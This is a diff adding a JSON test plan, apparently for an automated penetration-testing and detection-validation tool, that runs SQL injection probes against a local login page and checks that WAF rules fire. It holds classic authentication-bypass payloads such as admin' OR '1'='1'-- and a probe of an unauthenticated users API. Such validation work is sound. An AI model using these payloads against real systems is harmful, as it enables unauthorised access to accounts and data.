@@ -1,0 +1,49 @@
+{
+  "planId": "plan-sqli-demo-001",
+  "attackPathId": "path-sqli-demo-001",
+  "authLevel": "L2",
+  "roe": ["127.0.0.1", "localhost"],
+  "collectorWindowSec": 120,
+  "steps": [
+    {
+      "stepId": "step-2a",
+      "parentStepId": "step-2",
+      "track": "pentest-ai",
+      "templateId": "sqli-boolean-probe",
+      "proofPointId": "PP-02",
+      "targetUrl": "http://127.0.0.1:8099/login",
+      "params": {
+        "truePayload": {"username": "admin' AND '1'='1'--", "password": "x"},
+        "falsePayload": {"username": "admin' AND '1'='2'--", "password": "x"}
+      }
+    },
+    {
+      "stepId": "step-2b",
+      "parentStepId": "step-2",
+      "track": "openaev",
+      "templateId": "http-sqli-inject-safe",
+      "proofPointId": "PP-02",
+      "targetUrl": "http://127.0.0.1:8099/login",
+      "params": {
+        "method": "POST",
+        "payload": {"username": "admin' OR '1'='1'--", "password": "probe"}
+      }
+    },
+    {
+      "stepId": "step-2c",
+      "parentStepId": "step-2",
+      "track": "collector",
+      "expectedRules": ["sqli_probe", "waf-alert"],
+      "defenseControl": "WAF",
+      "targetHostname": "127.0.0.1"
+    },
+    {
+      "stepId": "step-3",
+      "parentStepId": "step-3",
+      "track": "alternative_proof",
+      "templateId": "api-unauth-page1",
+      "proofPointId": "PP-05",
+      "targetUrl": "http://127.0.0.1:8099/api/users/1"
+    }
+  ]
+}
